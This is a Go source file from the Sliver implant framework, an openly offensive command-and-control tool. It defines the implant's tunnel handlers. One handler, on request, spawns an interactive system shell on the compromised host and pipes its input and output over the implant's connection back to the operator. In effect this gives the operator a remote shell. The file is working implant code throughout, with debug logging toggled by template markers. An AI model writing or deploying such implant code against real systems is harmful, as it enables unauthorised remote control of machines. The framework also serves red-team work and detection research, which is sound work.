package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"io"
	"time"

	// {{if .Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/shell"
	"github.com/bishopfox/sliver/sliver/transports"

	"github.com/golang/protobuf/proto"
)

const (
	readBufSize = 1024
)

var (
	tunnelHandlers = map[uint32]TunnelHandler{
		sliverpb.MsgShellReq: shellReqHandler,

		sliverpb.MsgTunnelData:  tunnelDataHandler,
		sliverpb.MsgTunnelClose: tunnelCloseHandler,
	}
)

// GetTunnelHandlers - Returns a map of tunnel handlers
func GetTunnelHandlers() map[uint32]TunnelHandler {
	return tunnelHandlers
}

func tunnelCloseHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	tunnelClose := &sliverpb.TunnelData{
		Closed: true,
	}
	proto.Unmarshal(envelope.Data, tunnelClose)
	tunnel := connection.Tunnel(tunnelClose.TunnelID)
	if tunnel != nil {
		// {{if .Debug}}
		log.Printf("[tunnel] Closing tunnel with id %d", tunnel.ID)
		// {{end}}
		connection.RemoveTunnel(tunnel.ID)
		tunnel.Reader.Close()
		tunnel.Writer.Close()
	}
}

func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	data := &sliverpb.TunnelData{}
	proto.Unmarshal(envelope.Data, data)
	tunnel := connection.Tunnel(data.TunnelID)
	if tunnel != nil {
		// {{if .Debug}}
		log.Printf("[tunnel] Write %d bytes to tunnel %d", len(data.Data), tunnel.ID)
		// {{end}}
		tunnel.Writer.Write(data.Data)
	} else {
		// {{if .Debug}}
		log.Printf("Data for nil tunnel %d", data.TunnelID)
		// {{end}}
	}
}

type tunnelWriter struct {
	tun  *transports.Tunnel
	conn *transports.Connection
}

func (t tunnelWriter) Write(data []byte) (n int, err error) {
	data, err = proto.Marshal(&sliverpb.TunnelData{
		TunnelID: t.tun.ID,
		Data:     data,
	})
	t.conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgTunnelData,
		Data: data,
	}
	return len(data), err
}

func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	shellReq := &sliverpb.ShellReq{}
	err := proto.Unmarshal(envelope.Data, shellReq)
	if err != nil {
		return
	}

	shellPath := shell.GetSystemShellPath(shellReq.Path)
	systemShell := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
	go systemShell.StartAndWait()
	// Wait for the process to actually spawn
	for {
		if systemShell.Command.Process == nil {
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	tunnel := &transports.Tunnel{
		ID:     shellReq.TunnelID,
		Reader: systemShell.Stdout,
		Writer: systemShell.Stdin,
	}
	connection.AddTunnel(tunnel)

	shellResp, _ := proto.Marshal(&sliverpb.Shell{
		Pid:      uint32(systemShell.Command.Process.Pid),
		Path:     shellReq.Path,
		TunnelID: shellReq.TunnelID,
	})
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: shellResp,
	}

	// Cleanup function with arguments
	cleanup := func(reason string) {
		// {{if .Debug}}
		log.Printf("Closing tunnel %d (%s)", tunnel.ID, reason)
		// {{end}}
		connection.RemoveTunnel(tunnel.ID)
		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
			Closed:   true,
			TunnelID: tunnel.ID,
		})
		connection.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}
	}

	go func() {
		for {
			tWriter := tunnelWriter{
				tun:  tunnel,
				conn: connection,
			}
			_, err := io.Copy(tWriter, tunnel.Reader)
			if systemShell.Command.ProcessState != nil {
				if systemShell.Command.ProcessState.Exited() {
					cleanup("process terminated")
					return
				}
			}
			if err == io.EOF {
				cleanup("EOF")
				return
			}
		}
	}()

	// {{if .Debug}}
	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
	// {{end}}

}
